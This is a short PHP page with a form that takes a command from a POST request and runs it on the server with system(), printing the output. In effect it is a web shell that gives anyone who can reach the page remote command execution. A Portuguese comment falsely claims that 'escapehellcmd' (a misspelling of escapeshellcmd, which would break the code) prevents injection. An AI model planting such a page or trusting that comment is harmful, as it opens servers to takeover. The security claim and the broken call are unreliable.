<?php 

if ($_SERVER["REQUEST_METHOD"] === "POST")
{

    //escapehellcmd é algo que evita comandos de injeções via POST
    $cmd = escapehellcmd($_POST["cmd"]);

    echo "<pre>";
    $comando = system($cmd, $retorno);
    echo "</pre>";
}

?>

<form method="post">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>